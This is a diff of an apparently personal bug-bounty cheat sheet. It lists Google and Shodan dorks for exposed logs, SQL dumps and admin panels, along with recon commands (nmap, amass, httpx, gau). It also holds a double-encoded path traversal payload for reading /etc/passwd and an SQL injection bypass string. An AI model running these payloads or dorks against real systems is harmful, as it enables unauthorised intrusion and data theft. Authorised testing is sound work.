@@ -12,28 +12,36 @@ google dorks :
   
   allintext:username filetype:log     >> find log files 
   ext:sql intext:"-- phpMyAdmin SQL Dump"
-  
-  
-  1) go get -u http://github.com/lc/gau
+ 
+ 
+ ----------------------------------------------------------------------------------------------
+1) go get -u http://github.com/lc/gau
 2) echo "http://drive.google.com" | gau
 3) Read all the secrets
-  
+
+
+
+----------------------------------------------------------------------------------------------
   
   Path traversal to LFI 
 
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
   
-  ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
-  nmap -sV -iL host.txt -oN nmap_scan.txt
+----------------------------------------------------------------------------------------------
+nmap -sV -iL host.txt -oN nmap_scan.txt
 
 Wait a few hours
 
 cat nmap_scan.txt | grep open http://pic.example.com
 
+
+----------------------------------------------------------------------------------------------
+                        SQLI 
+          
 AAAA')/**/or/**/(select/**/1)=1%23
 
 
-
+----------------------------------------------------------------------------------------------
 amass <<
     amass enum -ip -src -brute -df domains
     
@@ -54,18 +62,23 @@ IDOR ::
   go to my cart and intercept and change the id 
 
 
-
+----------------------------------------------------------------------------------------------
 
 Directory listing::
         try every dir in debuging folders 
               http://example.com/assets
               https://example.com/app
+              http://example.com/en
 
   
   
-  
+  ----------------------------------------------------------------------------------------------
   httpx -l hosts.txt -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-lengthhttpx -l hosts.txt -ports 80,443,8009,8080,8081,8090,8180,8443 -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-length
-  
+----------------------------------------------------------------------------------------------
+
+
+
+
   shodan :: 
       ssl.cert.subject.cn:"website.com" http.title:"admin"
       ssl: "website.com" http.title: "admin"
